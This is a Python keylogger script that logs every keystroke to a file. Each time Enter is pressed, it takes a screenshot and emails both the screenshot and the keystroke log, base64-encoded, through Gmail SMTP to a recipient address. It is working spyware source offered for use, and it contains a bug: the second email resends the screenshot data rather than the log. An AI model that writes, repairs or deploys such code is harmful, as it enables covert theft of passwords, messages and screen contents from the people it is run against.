#First we need to pip install all the required libraries: 

#Imports:
import pynput
from pynput.keyboard import Key, Listener
import logging
from PIL import ImageGrab
import base64,os
import smtplib

#Hacemos el log file
log_dir=""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    
    logging.info(str(key))
    if key == Key.enter:
        #take screenshot:---------------------------------------------------------------------
        snapshot = ImageGrab.grab() # Take snap
        file = "scr.jpg"
        snapshot.save(file)         # Save the snap
        f=open('scr.jpg','rb')      #Open file in binary mode
        data=f.read()
        data=base64.b64encode(data) #Convert binary to base 64 
        f.close()
        os.remove(file)             # Remove the snap

        s = smtplib.SMTP('smtp.gmail.com', 587)   
        s.starttls()
        # [!]Remember! You need to enable 'Allow less secure apps' in your Google account
        # Enter your gmail username and password
        s.login("sender@gmail.com", "senderpassword")
        #
    
        # message to be sent 
        message = data # data variable has the base64 string of screenshot
    
        # Sender email, recipient email 
        s.sendmail("sender@gmail.com", "recipient@gmail.com", message) 
        s.quit()
        #Although the file is sent in base 64 we can decode it in multiple ways. 
        #---------------------------------------------------------------------------------------

        #Send the log file:
        file2 = "key_log.txt"
        f2=open(file2,'rb')
        data2=f2.read()
        data2=base64.b64encode(data) #Convert binary to base 64 
        f2.close()
        #os.remove(file)             #keep commented if you want to keep the log file.

        s = smtplib.SMTP('smtp.gmail.com', 587)   
        s.starttls()

        s.login("sender@gmail.com", "senderpassword")
        # message to be sent 
        message = data2 # data variable has the base64 string of screenshot
    
        s.sendmail("sender@gmail.com", "recipient@gmail.com", message) 
        s.quit()



with Listener(on_press=on_press) as listener:
    listener.join()


